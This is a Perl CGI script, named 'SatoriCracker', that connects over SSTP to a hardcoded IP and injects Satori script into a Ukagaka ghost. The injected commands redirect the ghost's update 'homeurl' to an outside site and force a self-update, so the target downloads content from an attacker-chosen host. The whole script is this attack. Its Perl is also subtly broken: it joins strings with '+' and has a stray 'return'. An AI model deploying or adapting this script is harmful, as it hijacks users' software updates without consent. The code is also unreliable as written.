#!/usr/bin/perl
use utf8;
use Socket;


$port=9801;
$addr=$ENV{'HTTP_X_FORWARDED_FOR'};
if (index($addr,'.')==-1) { $addr = $ENV{'REMOTE_ADDR'}; }

$addr='221.42.112.13';

$proto = getprotobyname('tcp');
socket(S, PF_INET, SOCK_STREAM, $proto);
$ent = sockaddr_in($port, inet_aton($addr));
connect(S, $ent) || die;
select(S); $| = 1; select(STDOUT);

print S "SEND SSTP/1.1\r\n";
print S "Charset: UTF-8\r\n";
print S "Sender: SatoriCracker\r\n";
print S "Event: ShioriEcho\r\n";
print S "Reference0: "+'（単語の追加、homeurl、http://nikola.ps.land.to/sstp/ghost/satoricracker/）（単語の追加、OnSecondChange、\![updatebymyself]\e）\e'+"\r\n";
print S "IfGhost: "+'ポスト'+"\r\n";
print S "Script: "+'\-\e'+"\r\n";
print S "\r\n";


print "content-type: text/plain\n";
print "\n";

$result = <S>;
while (<S>) { print; }
close(S);

return($result);





